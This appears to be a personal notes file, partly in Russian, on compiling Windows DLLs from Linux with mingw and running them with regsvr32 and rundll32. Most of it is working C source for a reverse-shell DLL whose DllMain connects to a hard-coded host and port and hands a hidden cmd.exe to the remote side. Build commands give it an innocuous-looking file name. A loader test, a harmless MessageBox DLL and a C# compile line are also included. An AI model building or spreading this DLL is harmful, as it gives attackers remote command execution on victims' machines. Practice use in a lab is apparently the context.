# c-c-
 
regsvr32.exe ReverseShellDLL.dll (запуск dll)
 
-static     компиляция со всеми билиотеками во внутрь

Cоздание dll


sudo apt install mingw-w64

x86_64-w64-mingw32-gcc-win32 shell.c -shared -lws2_32 -o VerifyThemeVersion.dll

python3 -m pefile exports VerifyThemeVersion.dll (скажет что за функции находятся внутри)

rundll32 shell,0

----------------------
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>



static int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
                write(2, "[ERROR] WSASturtup failed.\n", 27);
                return (1);
        }

        int port = CLIENT_PORT;
        struct sockaddr_in sa;
        SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = inet_addr(CLIENT_IP);


        if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
                write(2, "[ERROR] connect failed.\n", 24);
                return (1);
        }


        STARTUPINFO sinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES);
        sinfo.hStdInput = (HANDLE)sockt;
        sinfo.hStdOutput = (HANDLE)sockt;
        sinfo.hStdError = (HANDLE)sockt;
        PROCESS_INFORMATION pinfo;
        CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

        return (0);
}

void DllMain() {
        ReverseShell("192.168.50.123", 9001);
//        ReverseShell("10.10.14.20", 9001);
}
-----------------------------------------Вызывалка----------------------

x86_64-w64-mingw32-gcc-win32 test.c  -o test.exe
    --------------------------------
#include <windows.h>
#include <stdio.h>

int main( void )
{
        HINSTANCE hDll;

        // Load Dll
        hDll = LoadLibrary(TEXT("max.dll"));

        // If Dll Was Loaded
        if (hDll != NULL){
                printf("DLL Found\n");
                } else {
                printf("DLL Not Found");
                }
        return 0;
}

----------------------------------------------------ДЛЛКА

x86_64-w64-mingw32-gcc-win32 max.c  -o max.dll -shared

   ------------------------------------------

#include <windows.h>

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
        switch (dwReason)
        {
         case DLL_PROCESS_ATTACH:
          MessageBox(NULL,
                        "dsfvsdfsd",
                        "dsvsdvs",
                        MB_ICONERROR | MB_OK);
        break;
        }
return TRUE;
}



                






















-----------------------------------------
# Компиляция C# из линукс

sudo apt install mono-devel

mcs -target:library -out:Shell.dll Shell.cs

